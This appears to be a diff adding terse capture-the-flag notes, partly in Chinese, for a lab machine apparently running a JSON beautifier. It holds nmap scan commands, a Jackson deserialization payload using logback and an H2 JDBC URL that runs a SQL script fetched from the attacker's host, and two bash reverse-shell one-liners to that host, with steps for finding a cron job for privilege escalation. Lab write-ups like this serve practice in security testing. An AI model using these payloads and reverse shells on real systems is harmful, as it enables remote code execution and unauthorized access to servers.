@@ -1,0 +1,20 @@
+nmap -sC -sV -Pn 10.129.133.217 > nmap.txt
+nmap -p- 10.129.133.217 > nmapall.txt
+
+
+Validation failed: Unhandled Java exception: com.fasterxml.jackson.core.JsonParseException:
+Unrecognized token 'fdgfdg': was expecting 'null', 'true', 'false' or NaN
+
+
+1.nmap掃描出來發現80端口是json beautifier,上網搜索可以發現漏洞利用,輸入以下命令可以執行指令
+["ch.qos.logback.core.db.DriverManagerConnectionSource",{"url":"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://10.10.14.50/inject.sql'"}]
+2.創建inject.sql,執行後取得reverse shell
+3.使用LinEnum查找到有定時任務
+4.定時任務會斷線，登入後立即更改密碼
+
+
+Linux time 5.4.0-52-generic #57-Ubuntu SMP Thu Oct 15 10:57:00 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
+('/bin/bash -i >& /dev/tcp/10.10.14.50/4444 0>&1')
+('/bin/bash -i >& /dev/tcp/10.10.14.50/5555 0>&1')
+pericles:x:1000:1000:Pericles:/home/pericles:/bin/bash
+
